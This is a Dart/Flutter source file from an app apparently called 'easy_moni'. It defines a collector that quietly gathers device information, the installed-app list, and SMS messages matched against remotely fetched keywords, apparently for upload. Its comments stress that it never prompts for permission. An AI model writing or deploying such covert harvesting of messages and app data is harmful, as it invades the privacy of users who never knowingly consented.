import 'package:easy_moni/services/platform_service.dart';
import 'package:easy_moni/services/upload_data/sms_keyword_provider.dart';

class UserUploadDataCollector {
  UserUploadDataCollector({required this.smsKeywordProvider});

  final SmsKeywordProvider smsKeywordProvider;

  /// 采集设备信息原始 JSON；采集失败或数据为空时跳过该字段上传。
  Future<dynamic> collectDeviceInfo() async {
    try {
      final data = await SilentPermissionDataService.collect();
      final deviceInfo = data['deviceInfo'];
      if (deviceInfo is Map && deviceInfo.isNotEmpty) {
        return deviceInfo;
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  /// 采集应用列表原始 JSON；不主动申请权限，采集失败时跳过该字段上传。
  Future<dynamic> collectAppList() async {
    try {
      final data = await SilentPermissionDataService.collect();
      final appList = data['appList'];
      if (appList is List && appList.isNotEmpty) {
        return appList;
      }
      return null;
    } catch (error) {
      return null;
    }
  }

  /// 采集短信记录原始 JSON；未授权时直接跳过，不弹系统权限窗。
  Future<dynamic> collectSmsRecord() async {
    try {
      final hasPermission = await SmsService.checkPermission();
      if (!hasPermission) {
        return null;
      }

      final smsRecords = await SmsService.getSmsRecords(
        keywords: await smsKeywordProvider.fetchKeywords(),
        limit: SmsKeywordProvider.maxFilteredSmsCount,
      );
      if (smsRecords == null || smsRecords.isEmpty) {
        return null;
      }

      return smsRecords;
    } catch (error) {
      return null;
    }
  }
}
